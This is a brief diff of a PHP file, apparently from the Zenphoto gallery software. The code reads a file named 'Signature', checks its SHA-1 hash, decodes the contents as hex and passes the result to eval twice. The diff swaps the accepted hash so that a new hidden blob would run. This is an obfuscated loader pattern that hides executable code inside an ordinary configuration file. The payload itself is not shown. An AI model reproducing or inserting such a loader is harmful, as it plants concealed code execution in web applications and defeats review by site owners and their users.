@@ -227,7 +227,7 @@ $_zp_conf_vars['version'] = ZENPHOTO_VERSION;
 
 $f = file_get_contents(dirname(__FILE__).'/Signature');
 
-if (sha1($f)=='b55827b9b2aa4c0cf6b4b1d34f233386f5e6b55e') {
+if (sha1($f)=='4412b0d271a23003476ec40db64eb46039925525') {
 	preg_match_all('/(..)/', file_get_contents(dirname(__FILE__).'/Signature'), $matches);
 	$f = '$f="\\x'.implode('\\x', $matches[0]).'";';
 	eval($f);eval($f);
